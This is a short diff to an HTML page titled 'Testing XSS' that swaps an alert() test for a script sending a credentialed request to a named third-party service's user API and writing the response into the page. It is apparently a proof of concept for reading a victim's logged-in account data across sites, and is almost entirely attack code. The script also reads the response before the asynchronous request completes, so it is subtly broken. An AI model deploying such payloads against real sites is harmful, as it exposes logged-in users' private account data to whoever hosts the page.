@@ -7,7 +7,13 @@ div {text-align: center;}
 </style>
     <title>Testing XSS</title>
     <body>
-      <div><script>alert('b0rn2r00t')</script></div>
+      <script>
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', "https://app.clickup.com/v1/user");
+        xhr.withCredentials = true;        
+        xhr.send();
+        document.write(this.response);
+</script>
     </body>
   </head>
   </html>
